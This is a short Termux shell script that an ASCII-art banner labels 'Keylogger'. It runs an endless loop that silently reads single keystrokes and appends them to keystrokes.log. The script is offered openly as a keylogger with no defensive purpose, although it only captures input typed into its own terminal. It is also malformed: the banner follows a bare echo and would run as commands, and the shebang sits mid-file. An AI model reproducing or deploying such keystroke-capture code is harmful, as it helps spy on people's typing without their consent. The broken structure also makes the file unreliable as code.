echo 

                                                               
 #   #                 ##                                      
 #  #                   #                                      
 # #     ###   #   #    #     ###    ## #   ## #   ###   # ##  
 ##     #   #  #   #    #    #   #  #  #   #  #   #   #  ##  # 
 # #    #####  #  ##    #    #   #   ##     ##    #####  #     
 #  #   #       ## #    #    #   #  #      #      #      #     
 #   #   ###       #   ###    ###    ###    ###    ###   #     
               #   #                #   #  #   #               
                ###                  ###    ###                

#!/data/data/com.termux/files/usr/bin/sh

touch keystrokes.log
while true; do
    read -rsn1 input
    echo $input >> keystrokes.log
done

